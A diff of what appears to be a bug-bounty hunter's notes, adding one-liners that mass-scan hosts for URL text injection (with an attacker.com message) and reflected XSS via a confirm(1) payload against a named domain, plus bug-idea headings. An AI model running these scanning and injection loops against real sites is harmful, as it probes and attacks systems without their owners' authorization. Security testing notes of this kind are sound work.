@@ -121,7 +121,7 @@ censys search 'apache unomi' | jq -r '.[] | .ip'
 
 
 
-
+good bugs:
 
 -)text injection in url  - google --search inurl:vimeo --pages 1 | while read host do; do curl --silent https://$host/.htaccess__________hello%20every_one%20currently%20this%20website%20under%20construction%20so%20please%20visit%20https://attacker.com___ | grep -q attacker && \printf "$host \033[0;31mVulnerable\n"; done
 
@@ -135,8 +135,6 @@ censys search 'apache unomi' | jq -r '.[] | .ip'
 -)paramspider
 paramspider -d unifytwin.com --subs false --placeholder '"/><script>confirm(1)</script>' > optimizely.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
 
-
-
 -) prototype pollution using objects
 
 -)github exposing sensitive data - trufflehog etc
@@ -147,6 +145,8 @@ paramspider -d unifytwin.com --subs false --placeholder '"/><script>confirm(1)</
 
 
 
+low bugs: 
+Session not expires after the password reset
 
 
 
